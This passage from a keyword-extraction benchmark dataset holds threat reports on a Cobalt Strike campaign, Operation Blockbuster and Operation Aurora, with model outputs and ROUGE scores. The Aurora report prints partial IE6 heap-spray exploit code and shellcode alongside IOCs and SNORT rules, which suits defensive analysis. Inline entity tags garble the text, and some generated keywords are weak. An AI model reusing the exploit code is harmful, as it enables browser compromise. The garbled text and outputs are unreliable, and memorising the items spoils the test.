Win32.Backdoor . [ORG] CobaltStrike . ConclusionThreat actors always try to find ways to blend into real traffic . In this case . they are using an [ORG] SSL / TLS connection and a host header set to a legitimate [ORG] Microsoft website . [CARDINAL] One such evasion trick that we covered in our earlier blog was the use of FakeTLS header . The Zscaler ThreatLabZ team is continuously monitoring threat actors and ensuring protection against such threats . Acknowledgment Thanks to Adtiya Sharma for providing support in the research . MITRE ATT&CK TTP MappingIDTechniqueDescriptionT1193Spearphishing [ORG] AttachmentDocument is delivered as an email attachmentT1086 PowerShellUses [ORG] PowerShell to run shellcodeT1204 [ORG] User [ORG] ExecutionUses doc attachment requiring user interactionT1140 Deobfuscate / Decode [ORG] Files or [FAC] Information [FAC] Decrypt payloads during [PERSON] executionT1027 [PERSON] Obfuscated [PERSON] Files or [ORG] InformationUses encrypted payloadsT1036 [ORG] MasqueradingUses fake [ORG] GIF header magic bytes and filenameurl [ORG] Attack [ORG] Leverages [GPE] India - China Border DisputeT1043 Commonly Used Port443T1008 Fallback ChannelsUses [CARDINAL] more [CARDINAL] than [CARDINAL] one C&CT1071Standard Application Layer ProtocolUses HTTPsNote : The [ORG] TTP list above contains [ORG] TTP observed during the campaign as a Cobalt Strike beacon has many more features . A complete list of 114.67.110[.]37 userimage8.360doc[.]com image91.360doc[.]com welcome.toutiao[.]comAppendix", "generated_text": "PDF; a malicious document; India-China border tensions; victims; The malware; malicious macro code; Cobalt Strike beacon; steganography; analysis; the attack; the malware; the malware; the DKMC framework; communication; the C&C; communications; steganography; the C&C profile; the shellcode; a function; persistence; EXE; the C&C; analysis; the target.", "ref_text": "<START-1>The document analyzes a targeted attack campaign that leveraged the India-China border dispute as a lure. The attack starts with a malicious Word document sent via email that appears to contain an article about the border tensions. The document contains a macro that executes a PowerShell command to run embedded shellcode. The shellcode is fileless and does not write anything to disk. It downloads a second stage shellcode pretending to be from a Microsoft domain using a fake HTTP host header. The second shellcode contains a Cobalt Strike beacon payload encrypted with a GIF header. The shellcode decrypts this payload and executes it. The beacon uses Domain Generated Algorithm (DGA) domain C2 servers and steganography to blend in. The attackers used the DKMC malware framework along with Cobalt Strike. While attribution is unclear, OceanLotus and TrickBot groups have used similar techniques. The campaign shows how adversaries leverage current geopolitical events as lures and evade detection via living off the land tools, fake headers, encryption, and proxy comms. In summary, this was a sophisticated, targeted attack abusing the India-China dispute to trick victims into downloading modular, fileless malware designed to evade detection while enabling the attackers to control compromised systems. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5063291139240507, "gpt3/lexical/rouge_rouge2": 0.19745222929936307, "gpt3/lexical/rouge_rougeL": 0.310126582278481, "gpt3/lexical/rouge_rougeLsum": 0.310126582278481, "gpt3_generated_text": ["This article discusses a targeted cyber attack that leverages the current India-China border dispute to lure victims into opening a malicious document. The attack is fileless and uses steganography to hide communication with the command and control (C&C) server. The malicious lure document contains corrupted macro code, which, when analyzed, reveals a PowerShell command designed to run shellcode. The shellcode, in turn, downloads another shellcode with a valid GIF header, which contains a Cobalt Strike beacon. The beacon is configured to point to a specific C&C address and communicates using a fake HTML host header and a predefined user agent. The article provides a detailed analysis of the attack and its attribution."]}, {"split_name": "test", "sample_id": "test_22", "prompt_text": "Extract the keywords: EXECUTIVE SUMMARYDOWNLOAD THE FULLOPERATION BLOCKBUSTERREPORT AT : www . OperationBlockbuster.com\u0080 MALWARE FAMILIES \u0080Operation BlockbusteRUnraveling the Long Thread of [ORG] the [ORG] Sony [ORG] Pictures AttackINTRODUCTION The [DATE] 2014 [ORG] Sony [ORG] Pictures hack was [CARDINAL] one of the most shocking and significant cyber attacks against a [GPE] U.S. commercial enterprise to date . The incident caused significant financial and reputational damage to [ORG] Sony [ORG] Pictures and its executives . Most importantly , it illustrated how little resistance a corporate enterprise is able to provide in the face of a capable and determined adversary with destructive intent . In [PERSON] Operation [PERSON] Blockbuster , a [ORG] Novetta - led coalition , comprised of [ORG] the [ORG] Novetta [ORG] Threat [ORG] Research [ORG] & [ORG] Interdiction [ORG] Group ( [ORG] NTRIG ) and private industry partners , identified and interdicted the adversary behind the [ORG] Sony [ORG] Pictures attack . The coalition links this adversary \u2013 dubbed \u201c [WORK_OF_ART] the [WORK_OF_ART] Lazarus [WORK_OF_ART] Group \u201d \u2013 to the repeated use of particular malware code and numerous malicious attacks against commercial , military and government targets , dating as far back as [CARDINAL] 2009.KEY [ORG] TAKEAWAYS [ORG] } [ORG] Malware used in the [DATE] November [DATE] 2014 [ORG] Sony [ORG] Pictures attack is definitively linked to malwaredeveloped [DATE] as [DATE] early [DATE] as [DATE] 2009 . } The same malware has been used to target government , media , military , aerospace , financial , and critical infrastructure entities , primarily in [GPE] South [GPE] Korea and [GPE] the [GPE] United [GPE] States . } The depth and scope of evidence suggests that the [ORG] Sony [ORG] Pictures attack was carried out by a well - structured , well - resourced and highly motivated organization , and not the work of a pop - up hacktivist group . } [ORG] Novetta \u2019s coordinated , ongoing response illustrates that in this new era of cyber defense , private industry \u2019s role has changed from \u201c observe and report \u201d to \u201c observe and act . \u201dDELTADDoSHOTELHTTP [PERSON] ServerINDIAInstallerDeltaAlfa [PERSON] GroupLIMALoaderPAPAProxyROMEORATSIERRASpreaderLimaAlfaLimaBravoLimaCharlieLimaDeltaPapaAlfaTANGOTool ( Non - classed)UNIFORMUninstallerWHISKEYDestructive Malware ( \u201d Wiper\u201d)IndiaAlphaIndiaBravoIndiaCharlieIndiaDeltaIndiaEchoIndiaFoxtrotIndiaGolfIndiaHotelIndiaIndiaIndiaJuliettIndiaKiloIndiaWhiskeyRomeoAlfaRomeoBravoRomeoCharlieRomeoDeltaRomeoEchoRomeoFoxtrotRomeoGolfRomeoHotelRomeoMikeRomeoNovemberRomeoWhiskeySierraAlfaSierraBravoSierraCharlieSierraJuliett - MikeOneSierraJuliett - MikeTwoTangoAlfa [PERSON] TangoDeltaUniformAlfaUniformJuliettWhiskeyAlfaWhiskeyBravoWhiskeyCharlieWhiskeyDeltaMOST WIDELY REPORTED LINKS TO [ORG] LAZARUS [ORG] GROUP2009 [ORG] DDoS attack on [GPE] U.S. and [NORP] South [NORP] Korean websites ( MYDOOM)2012 Attack on a conservative [NORP] South [NORP] Korean media organization ( [PERSON] IsOne)2014 [PERSON] Attack on [ORG] Sony PicturesOPERATION [PERSON] DETAILS2011 [PERSON] Attack on [NORP] South [NORP] Korean media , financial , and critical infrastructure targets ( [DATE] Ten [DATE] Days of Rain)2013 Attack on [NORP] South [NORP] Korean broadcasters and banks signatures to disrupt [ORG] the [ORG] Lazarus [ORG] Group 's attacksIn [DATE] the [DATE] weeks following the [ORG] Sony [ORG] Pictures hack , US - CERT released an alert detailing a set of malware families used by unidentified attackers to compromise large network infrastructures and deploy hard - drive wiping malware , RATs , and proxy trojans . [ORG] Novetta \u2019s analysis of the base set of malware revealed that common code libraries were used across multiple malware families . The Operation Blockbuster team used these libraries to generate signatures to detect additional malware samples , including [CARDINAL] more [CARDINAL] than [CARDINAL] 45 distinct malware families that fall under [ORG] the [ORG] Lazarus [ORG] Group \u2019s domain . [ORG] Novetta , with the help of operation partners , made available signatures that identified [ORG] Lazarus [ORG] Group tools on a broad scale , effectively disrupting the group \u2019s ability to use these tools for malicious intent . ACRONYM KEY : US - CERT : [ORG] United [ORG] States [ORG] Computer [ORG] Emergency [ORG] Readiness TeamRAT : \u201c Remote access trojan , \u201d a malware that includes backdoor access for control over a targeted [ORG] computerINDUSTRY \u2019S NEW ROLEIn Operation Blockbuster , [ORG] Novetta identified the specific attack tools of a well - connected , globally significant attack group . [ORG] Novetta and industry partners worked together to understand and devise ways to degrade the malware toolset , eroding the group \u2019s ability to use these tools for further harm . The industry team shared information and took decisive action to protect collective customers . This sets a precedent for industry \u2019s new role in the changing dynamic of cyber defense . Industry is no longer only a watchdog . As the work behind [PERSON] Operation [PERSON] Blockbuster continues , [ORG] Novetta demonstrates that elite security professionals with the right skills and talents , working collaboratively , can and should take decisive action not only to protect against attacks , but to fight back against attackers . These industry teams can provide customers with additional protection while educating the general public about modern cyber threats.7921 [PERSON] Jones [PERSON] Branch [PERSON] Drive , [GPE] McLean , VA 22102 571.282.3000BUSINESS IMPLICATIONSThe [ORG] Sony [ORG] Pictures attack , and the long thread of related attacks documented in [GPE] Operation [GPE] Blockbuster , demonstrates that commercial enterprises are already living in a new era of cyber threats . As corporations \u2019 cyber footprints continue to grow , security operations are often unable to scale . Malicious threat actors like [ORG] the [ORG] Lazarus [ORG] Group remain a step ahead . The urgency for building and maintaining a robust and evolving cybersecurity practice has never been greater . As an executive , you know it \u2019s your responsibility to maintain the integrity and security of your brand , and your customers \u2019 data . [ORG] Learn how to better protect your enterprise . Download Operation Blockbuster to read the full story and remediation suggestions . CONTACT NOVETTA :} Technical and security questions , contactNovetta \u2019s [ORG] Threat [ORG] Research [ORG] & [ORG] Interdiction [ORG] Group : trig@novetta.com } For information on [ORG] Novetta security services , solutions and products , email : contact@novetta.comDOWNLOAD THE FULLOPERATION BLOCKBUSTER REPORT AT : www . [ORG] OperationBlockbuster.com", "generated_text": "Operation Blockbuster; the Lazarus Group; the Sony Pictures attack; early 2009; government; media; military; aerospace; financial; critical infrastructure entities; South Korea; the US; key; the Sony Pictures hack; PAPAProxy; Trojan; malware code; attacks; 2009; KEY TAKEAWAYS; a well-structured, well-resourced; highly motivated; a well-structured, well-resourced; highly motivated; The depth; scope; evidence; the Sony Pictures attack; a well-structured; well-resourced; highly motivated; a firm; a pop-up hacktivist group; the second half of the cyber revolution; the threat actor; The report; the Sony Pictures hack; the 2014 attack; the Lazarus Group; use; a well-structured, well-resourced; highly motivated; the PSP; the cyber defense; private industry; control; the nature; the threat.", "ref_text": "<START-1>The Operation Blockbuster report details the investigation into the cyberattack against Sony Pictures in 2014. The attack caused significant financial and reputational damage to Sony and exposed how vulnerable corporations are against sophisticated cyber adversaries. A coalition led by Novetta identified the group behind the Sony attack, called the Lazarus Group. Through analysis of the malware used, the coalition linked the Lazarus Group to cyberattacks going back to at least 2009. The group has targeted government, military, media, aerospace, and critical infrastructure entities, mainly in South Korea and the United States. The evidence suggests the Sony attack was carried out by a well-resourced, motivated organization rather than a random hacktivist group. The malware analysis revealed the group consistently reuses code libraries across multiple malware families. Novetta generated signatures to detect the malware, disrupting the Lazarus Group's cyber capabilities. The report highlights the new role of private industry in cyber defense. Rather than just observing and reporting, the coalition took action to understand the threat and protect customers. This collaborative effort between Novetta and industry partners represents a new model of proactive cyber defense. The Sony attack demonstrates commercial enterprises are vulnerable to advanced cyber threats. As companies expand their digital footprint, security practices struggle to keep up. The report stresses the urgency for robust and adaptive cybersecurity policies to protect brands and customer data. It encourages business leaders to learn from the Sony case and prioritize cybersecurity. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5315068493150685, "gpt3/lexical/rouge_rouge2": 0.22589531680440772, "gpt3/lexical/rouge_rougeL": 0.34520547945205476, "gpt3/lexical/rouge_rougeLsum": 0.34520547945205476, "gpt3_generated_text": ["The 2014 Sony Pictures hack was a significant cyber attack that caused financial and reputational damage to the company. Operation Blockbuster, led by Novetta and private industry partners, identified and interdicted the adversary behind the attack, known as the Lazarus Group. The same malware used in the Sony Pictures attack has been used to target various entities in South Korea and the US since 2009. The evidence suggests that the Lazarus Group is a well-structured and well-resourced organization, rather than a pop-up hacktivist group. Novetta's response to the attack demonstrates that private industry now has a role in actively responding to cyber threats. The report highlights the need for private industry to observe and act in the new era of cyber defense."]}, {"split_name": "test", "sample_id": "test_23", "prompt_text": "Extract the keywords: OPERATION AU RORAD E T E C T , D I A G N O S E , R E S P O N DJan [DATE] 27 , [CARDINAL] 2010\\ [WORK_OF_ART] Cyber [WORK_OF_ART] Espionage is a critical issue . [PERCENT] Over [PERCENT] 80 [PERCENT] % of intellectual property is stored online digitally . The computing infrastructure in a typical Enterprise is more vulnerable to attack than ever before . Current security solutions are proving ineffective at stopping cyber espionage . [ORG] Malware is the single greatest problem in computer security [DATE] today . Yet , malware represents only the tip of the spear . The true threat is the human being who is operating the malware . This human , or the organization he represents , is the true threat that is targeting information for the purposes of financial gain , theft of state secrets , and theft of intellectual property . True threat intelligence requires reaching beyond malware infections to identify the individuals , country of origin , and intent of the attacker . THREAT SUMMARY The [PERSON] Aurora malware operation was identified recently and made public by Google and [PERSON] McAfeei . This malware operation has been associated with intellectual property theft including source code and technical diagrams ( [ORG] CAD , oil exploration bid - data , etc ) . Companies hit have been publically speculated , including [ORG] Google , Adobe , Yahoo , [NORP] Symantec , [ORG] Juniper [ORG] Systems , [ORG] Rackspace , [PERSON] Northrop [PERSON] Grumman , [ORG] ExxonMobil , [ORG] ConocoPhillips , and [ORG] Dow [ORG] Chemical . The malware package used with [PERSON] Aurora is mature and been in development since [DATE] at [DATE] least [DATE] 2006 . The [PERSON] Aurora operation is characterized by a remotely operated backdoor program that persists on a [PRODUCT] Windows computer . This backdoor program has several capabilities that are outline below . K E Y F I N D I N G SEvidence collected around the malware operation suggest that [PERSON] Operation [PERSON] Aurora is simply an example of highly effective malware penetration . There is not significant evidence to attribute the operation directly to [ORG] the [ORG] Chinese [ORG] Government . However , a key actor has been identified in association with [PERSON] Operation [PERSON] Aurora . Aspect TargetOriginDescription The operation is targeting intellectual property with no specific industry focus . This is an example of \" not knowing what they are looking for until they find it \" . It is highly probable that the malware was developed in native [LANGUAGE] Chinese language , and the operation control system is designed for [NORP] Chinese users , indicating the entire operation is [NORP] Chinese . This does not , however , mean [ORG] the [ORG] Chinese [ORG] Government is using the system . Developers Forensic tool - marks in the [ORG] CRC algorithm can be traced to [NORP] Chinese origin . That , combined with domain registration information , leads to [CARDINAL] at [CARDINAL] least [CARDINAL] one potential actor , [PERSON] Peng [PERSON] Yongii . The malware has been in development since [DATE] at [DATE] least [DATE] 2006 . It has been updated several times . Operators Operators of the malware appear to use certain domains for [ORG] C&C control . Intent ComsDynamic [ORG] DNS is a key feature of the operation , with many known [ORG] C&C servers operating from domains registered through [PERSON] Peng [PERSON] Yong 's 3322.org service . The primary intent is the theft of intellectual property . Communication is encrypted over [ORG] HTTP , port [CARDINAL] 443 , obfuscated with a weak encryption scheme . The [ORG] C&C servers tend to operate from domains hosted on dynamic DNS.A T T R I B U T I O NAt this time , there is very little available in terms of attribution . A [ORG] CRC algorithm tends to indicate the malware package is of [NORP] Chinese origin , and many attacks are sourced out of a service called 3322.org - a small company operating out of [GPE] Changzhou . The owner is [PERSON] Peng [PERSON] Yong , a [LANGUAGE] Mandarin speaker who may have some programming background with such algorithms . His dynamic [ORG] DNS service hosts over [CARDINAL] 1 [CARDINAL] million domain names . Over [DATE] the [DATE] last [DATE] year , HBGary has analyzed [CARDINAL] thousands of distinct malware samples that communicate with 3322.org . While [PERSON] Peng [PERSON] Yong is clearly tolerant of cyber crime operating through his domain services , this does not indicate he has any direct involvement with [PERSON] Aurora . ToolmarkDescriptionEmbedded Resource Language Code UNITED STATES [ORG] CRC [ORG] Algorithm [ORG] Table [ORG] of [ORG] Constants [ORG] DNS registration servicesEmbedded systems / [NORP] Chinese publicationiii [PERSON] Peng [PERSON] Yong , othersDETECT This section of the report details how you can detect Operation [PERSON] Aurora in your Enterprise . The exploit and payload vehicle consists of the following components:\u2022\u2022\u2022Javascript based exploit vector , known to exploit IE [CARDINAL] 6 Shellcode component , embedded in the Javascript Secondary payload server that delivers a dropper\u2022 The dropper itself , which only used once and then deleted \u2022 The backdoor program which is decompressed from the dropperJ A V A S C R I P T A N D S H E L L C O D EThe JavaScript based attack vector associated with [PERSON] Operation [PERSON] Aurora was published in the public domain in [DATE] early [DATE] January [DATE] 2010 . [ORG] Microsoft details the vulnerability in Security Bulletin MS10 - 002 . Internet Explorer 5.01 , Internet Explorer 6 , Internet Explorer 6 Service Pack [CARDINAL] 1 , Internet Explorer 7 , and Internet Explorer 8 ( except Internet Explorer 6 for supported editions of [ORG] Windows [ORG] Server [ORG] 2003 ) are affected . Exploit code analyzed by HBGary reveals that only Internet Explorer 6 was targeted during Operation [PERSON] Aurora . This vulnerability can be leveraged by attackers of varying skill levels due to the public availability of the [GPE] Metasploit module \u201c ie_aurora.rb \u201d . The exploit code used by the original attackers was quickly improved and added to [GPE] Metasploit thus greatly expanding the potential number of attackers and reliability of code . The JavaScript performs a heap spray attack and injects the embedded shellcode described below . The JavaScript exploits the vulnerability in Internet Explorer by copying , releasing , and then referencing a Document Object Model Javascript Exploit Code unescape(\"%u9090%u19eb%u4b5b%u3390%u90c9%u7b80%ue901%u0175%u66c3%u7bb9%u8004%u0b34%ue2d8%uebfa%ue805%uffe2%uffff%u3931%ud8db%u87 [PERCENT] d8%u79bc%ud8e8%ud8d8%u9853%u53d4%uc4a8%u5375%ud0b0%u2f53%ud7b2%u3081%udb59%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u8caa%u9e53 [PERCENT] % u30d4%uda37%ud8d8%u3053%ud9b2%u308 SECTION REMOVED FOR SPACE 8%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3ee1%u1c40%uc755%u8fac%ud5be%u9b27%u7466%u4003%uc8d2%u5820%u770e%u2342 [PERCENT] % ucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ubbbb%uabbd%uf6ab%ubbbb%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u00d8 \" ) ; var sss = [ORG] Array ( [CARDINAL] 826 , [CARDINAL] 679 , [CARDINAL] 798 , [CARDINAL] 224 , [CARDINAL] 770 , [CARDINAL] 427 , [CARDINAL] 819 , [CARDINAL] 770 , [CARDINAL] 707 , [CARDINAL] 805 , [CARDINAL] 693 , [CARDINAL] 679 , [CARDINAL] 784 , [CARDINAL] 707 , [CARDINAL] 280 , [CARDINAL] 238 , [CARDINAL] 259 , [CARDINAL] 819 , [CARDINAL] 336 , [CARDINAL] 693 , [CARDINAL] 336 , [CARDINAL] 700 , [CARDINAL] 259 , [CARDINAL] 819 , [CARDINAL] 336 , [CARDINAL] 693 , [CARDINAL] 336 , [CARDINAL] 700 , [CARDINAL] 238 , [CARDINAL] 287 , [CARDINAL] 413 , [CARDINAL] 224 , [CARDINAL] 833 , SECTION REMOVED FOR SPACE [CARDINAL] 735 , [CARDINAL] 427 , [CARDINAL] 336 , [CARDINAL] 413 , [CARDINAL] 735 , [CARDINAL] 420 , [CARDINAL] 350 , [CARDINAL] 336 , [CARDINAL] 336 , [CARDINAL] 413 , [CARDINAL] 735 , [CARDINAL] 301 , [CARDINAL] 301 , [CARDINAL] 287 , [CARDINAL] 224 , [CARDINAL] 861 , [CARDINAL] 840 , [CARDINAL] 637 , [CARDINAL] 735 , [CARDINAL] 651 , [CARDINAL] 427 , [CARDINAL] 770 , [CARDINAL] 301 , [CARDINAL] 805 , [CARDINAL] 693 , [CARDINAL] 413 , [CARDINAL] 875 ) ; var arr = new [ORG] Array ; for ( var i = [CARDINAL] 0 ; i < sss.length ; i + + ) { arr[i ] = String.fromCharCode ( sss [ i ] / 7 ) ; var cc = arr.toString ( ) ; cc = cc.replace ( /,/g , \" \" ) ; cc = [PERSON] cc.replace ( /@/g , \" , \" ) ; var x1 = new [ORG] Array ( ) ; for ( i = [CARDINAL] 0 ; i < [CARDINAL] 200 ; i + + ) { x1 [ i ] = document.createElement ( \" COMMENT \" ) ; x1 [ i].data = \" abc \" ; var e1 = null ; function ev1 ( evt ) { e1 = document.createEventObject ( evt ) ; document.getElementById ( \" sp1\").innerHTML = \" \" ; window.setInterval ( ev2 , [DATE] 50 ) ; p = \" [WORK_OF_ART] \\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u [WORK_OF_ART] 0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\";for ( i [WORK_OF_ART] = [WORK_OF_ART] 0 ; i < x1.length ; i + + ) { x1 [ i].data = p ; } ; var t = e1.srcElement ; < span id=\"sp1\"><IMG [GPE] SRC=\"aaa.gif \" onload=\"ev1(event ) \" width=\"16 \" height=\"16\"></span > JavaScript ArtifactsPatternInitial encrypted dropper download . Deleted file . C:\\%appdata%\\a.exeDecrypted dropper . Deleted file . JavaScript present in Internet Explorer memory space . C:\\%appdata\\b.exe < code listed above > Download URL present in internet history during memory analysis . Other domains associated with Aurora.url 360.homeunix.com ftp2.homeunix.com update.ourhobby.com blog1.servebeer.comThe shellcode exists as a [GPE] Unicode escaped variable ( sc ) in the malicious [ORG] JavaScript listed below . Upon successful exploitation of Internet Explorer , the shellcode will download an obfuscated [ORDINAL] second stage executable from url which is the dropper . Note : these files are specific to the sample we analyzed at HBGary , Inc. The attackers must use a [ORDINAL] second stage download mechanism to achieve full system access due to memory constraints . It is unlikely that the final payload could be delivered through the original exploit given these conditions . The dropper is [PERSON] XOR encrypted with a [DATE] 0x95 key . The shellcode copies this encrypted binary to the user \u2019s [PRODUCT] AppData directory as \u201c a.exe \u201d . The shellcode then decrypts \u201c a.exe \u201d and moves it to \u201c b.exe \u201d in the same directory . Then \u201c b.exe \u201d is executed . The following actionable intelligence can be used to identify exploit remnants in the heap space of Internet [ORG] Explorer post exploitation attempt . These patterns can be searched for when doing memory analysis of a victim system . [PERSON] Shellcode ArtifactsPatternSelf - decrypting code using a constant [PERSON] XOR [PERSON] value.80 [CARDINAL] 34 [ORG] 0B D8 [CARDINAL] 80 [CARDINAL] 34 0B D8Kernel32.dll searching code.64 A1 [DATE] 30 [DATE] 00 00 00 [ORG] 8B 40 0C 8B [CARDINAL] 70 [CARDINAL] 1CPush Urlmon string to stack using [CARDINAL] two push statements . [CARDINAL] 68 [CARDINAL] 6F 6E 00 00 68 75 72 6C 6DThe following [ORG] SNORT rules have been released by the Emerging Threats project to detected the final payload command and control communications . Network Detection Signaturesalert tcp $ HOME_NET any - > $ EXTERNAL_NET 443 ( msg:\"ET TROJAN [PERSON] Aurora [PERSON] Backdoor ( [ORG] C&C ) client connection to [WORK_OF_ART] CnC \" ; flow : established , to_server ; content:\"|ff ff ff ff ff ff [CARDINAL] 00 [CARDINAL] 00 fe ff ff ff ff ff ff ff ff ff [CARDINAL] 88 ff| \" ; depth:20 ; flowbits : set , ET.aurora.init ; classtype : trojan - activity ; reference : url , www.trustedsource.org / blog/373 / An - Insight- into - the - Aurora - Communication - Protocol ; reference : url , doc.emergingthreats.net/2010695 ; reference : url , www.emergingthreats.net / cgi - bin / cvsweb.cgi / sigs / VIRUS [ORG] / TROJAN_Aurora ; sid:2010695 ; rev:2 ;) alert tcp $ EXTERNAL_NET 443 - > $ HOME_NET any ( msg:\"ET TROJAN [PERSON] Aurora [PERSON] Backdoor ( [ORG] C&C ) connection CnC response \" ; flowbits : isset , ET.aurora.init ; flow : established , from_server ; content:\"|cc cc cc cc cd cc cc cc cd cc cc cc cc cc cc cc| \" ; depth:16 ; classtype : trojan - activity ; reference : url , www.trustedsource.org / blog/373 / An - Insight - into - the- [ORG] Aurora - Communication - Protocol ; reference : url , doc.emergingthreats.net/2010696 ; reference : url , www.emergingthreats.net / cgi - bin / cvsweb.cgi / sigs / VIRUS [ORG] / TROJAN_Aurora ; sid:2010696 ; rev:2;)D R O P P E RThe initial dropper is merely a detonation package that decompresses an embedded [ORG] DLL into the [PRODUCT] Windows system32 directory and loads it as a service . The initial dropper is likely to be packed ( UPX , etc ) . The dropper has an embedded [ORG] DLL that is decompressed to the windows system32 directory . This [ORG] DLL will be named to resemble existing services ( rasmon.dll , etc ) . In order to evade forensics , the file - time of the dropped [ORG] DLL will be modified to match that of an existing system [ORG] DLL ( user32.dll , etc ) . The dropped [ORG] DLL is loaded into its own svchost.exe process . Several registry keys are created and then deleted as part of this process . Finally , the dropper deletes itself from the system by using a dissolving batch file ( DFS.BAT , etc).Actionable [ORG] Intelligence [ORG] Service [ORG] Key [ORG] & [ORG] Value [ORG] Note : deleted after drop Path to backdoor Note : deleted after stage 1 Path to backdoor Note : persistent [GPE] Potential variationPotential variationPattern SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\\ Value : [ORG] SysIns [ORG] Data : [PERSON] Ups ? ? ? ( ? ? ? are [CARDINAL] three random chars ) [PERSON] SYSTEM\\CurrentControlSet\\Services\\Ups???\\Parameters\\ [PERSON] Value : ServiceDLL Data : ( full path to the backdoor ) [PERSON] SYSTEM\\CurrentControlSet\\Services\\RaS???\\Parameters\\ [PERSON] Value : ServiceDLL Data : ( full path to the backdoor ) [PERSON] SYSTEM\\CurrentControlSet\\Services\\RaS???\\Parameters\\ [PERSON] Value : ServiceDLL Data : % temp%\\c_####.nls ( where # # # # is a number ) [PERSON] SYSTEM\\CurrentControlSet\\Services\\RaS???\\Parameters\\ [PERSON] Value : ServiceDLL Data : % temp%\\c_1758.nlsP A Y L O A [ORG] DGLANCE UNDER THE [NORP] HOODbuffer after phase one XOR : buffer after base64 decoding : \u00c3\u00c4\u00c6\u00ce\u00de\u00c5\u00c2\u00d3 \u2026 [ORG] \u00c8\u00c4\u00c6 \u00ab \u00ab \u00ab \u02dc\u00ab\u0178\u00ab\u201c\u00ab\u2020\u00ab\u0161\u00ab\u0161\u00ab\u017e\u00ab\u0161\u00ab\u0153The payload uses [CARDINAL] two - stage installation . During stage one , the dropper will install the payload as a service running under the name [PERSON] Ups ? ? ? ( where ? ? ? are [CARDINAL] three random characters ) . Once executing , the payload will immediately delete the [ORDINAL] first service and enter stage - two . During stage - two , the payload will register a new , [ORDINAL] second service under the name [PERSON] RaS ? ? ? ( where ? ? ? are [CARDINAL] three random characters ) . This new service will point to the same backdoor [ORG] DLL , no new files are involved . Note : the [CARDINAL] three character prefixes [PERSON] Ups and RaS can easily be modified by the attacker . Once the new service is registered , the payload will access an embedded resource that is encrypted . The decryption goes through several phases . The encrypted data block contains the [ORG] DNS name for the command and control server ( homeunix.com , etc ) . This data block is configurable before the malware is deployed . The data block length is hard - coded ( 0x150 or [CARDINAL] 336 bytes ) . During phase one , this data block is fed through a simple [WORK_OF_ART] XOR ( 0x99 ) , resulting in an [ORG] ASCII - string . Next , the resulting [ORG] ASCII - string is fed into a base64 decoding function , producing a binary string . Finally , the resulting base64 decoded binary string is fed through another XOR ( 0xAB ) , resulting in clear - text . The [CARDINAL] three primary encryption loops are colored and marked in Figure [CARDINAL] 1 . The resulting clear - text buffer contains several fields in both [ORG] ASCII and [ORG] UNICODE , including the [ORG] C&C server address . [ORG] C&C [ORG] Server [ORG] DNSPattern * .homeunix.com ( where * is any subdomain ) * .blogsite.orgThe payload will create additional registry keys . [PRODUCT] HKLM\\Software\\Sun\\1.1.2\\IsoTp [PRODUCT] Additional [ORG] KeyAdditional KeyHKLM\\Software\\Sun\\1.1.2\\AppleTlkOther potential dropped files , as reported by McAfee : securmon.dllAdditional File Additional FileAdditional FileAdditional File Additional FileAdditional FileAdditional File Additional FileAdditional FileC O M M A N D A N D C O N T R O LAppMgmt.dll A0029670.dll ( [ORG] A00#####.dll)msconfig32.sysVedioDriver.dll [ORG] acelpvc.dllwuauclt.exejucheck.exe AdobeUpdateManager.exezf32.dllThe payload communicates with its command and control server over port [CARDINAL] 443 . The source port is randomly selected . While outbound traffic appears to be HTTPS , the actual traffic uses a weak custom encryption scheme . The command and control packets have a very specific formativ.commandparameters0x00000001payload lenCRCKEYpayloadThe payload section is encrypted with a key selected by using GetTickCount . This means each infected node has its own key . The key is embedded in the header of the packet , and is easily recovered . DIAGNOS EH O W T H E M A L W A R E W O R K SThe primary control logic can be found in the module registered under the service key ( rasmon.dll , etc . ) . This module has been written in c and includes several specific methods and encodings that provide forensic track - ability . The above screenshot illustrates a [ORG] REcon(tm ) trace on the malware dropper and subsequent service creation . [PERSON] Location [PERSON] A. represents the dropper program , which unpacks itself and decompresses a file to the system32 directory . [PERSON] Point [PERSON] B. represents the initial svchost.exe startup , which is loading the malware payload . [PERSON] Location [PERSON] C. is the actual execution of the malware service , which remains persistent . At points E. and F. you can see the malware checking in with the command and control server . Finally , location [NORP] D. represents the dissolvable batch file which deletes the initial dropper and then itself . FIGURE 1 - BASE64 AND XOR ENCRYPTION SCHEMEC A P A B I L I T YThe malware has generic and flexible capabilities . There are distinct command handlers in the malware that allow files to be stolen and remote commands to be executed . The command handler is illustrated in Figure [CARDINAL] 2 . At location A. the command number is checked . At locations marked [ORG] B. are each individual command handler , as controlled by the [ORG] C&C server and command number in the [ORG] C&C packet . [PERSON] Location [PERSON] C. is where the result of each command is sent back to the [ORG] C&C server . R E C E N T G L O B A L A C T I V I T YThe concentration of the java - script exploit used to deliver [PERSON] Aurora is rising . The primary source countries are [GPE] China , [GPE] Korea , [GPE] India , and [LOC] Polandv . [ORG] TODO : [ORG] INSERT [ORG] DATA [ORG] FEED [ORG] STATS HERE.FIGURE 2 - C&C COMMAND PARSERRES POND Several Enterprise products have the capability to scan for and potentially remove the [PERSON] Aurora malware . Detection of the malware is covered in detail , from multiple aspects , in the [LOC] Detect section above . When using a [ORG] Digital DNA(tm ) capable platform such as [PERSON] McAfee [PERSON] ePO , Guidance EnCase Enterprise , or [ORG] Verdasys [ORG] Digital [ORG] Guardian , you can search the Enterprise for the following [ORG] Digital DNA sequence ( recommend a tight match , 90 [PERCENT] % or higher ) . Digital DNA Sequence for [PERSON] Aurora [PERSON] Malware 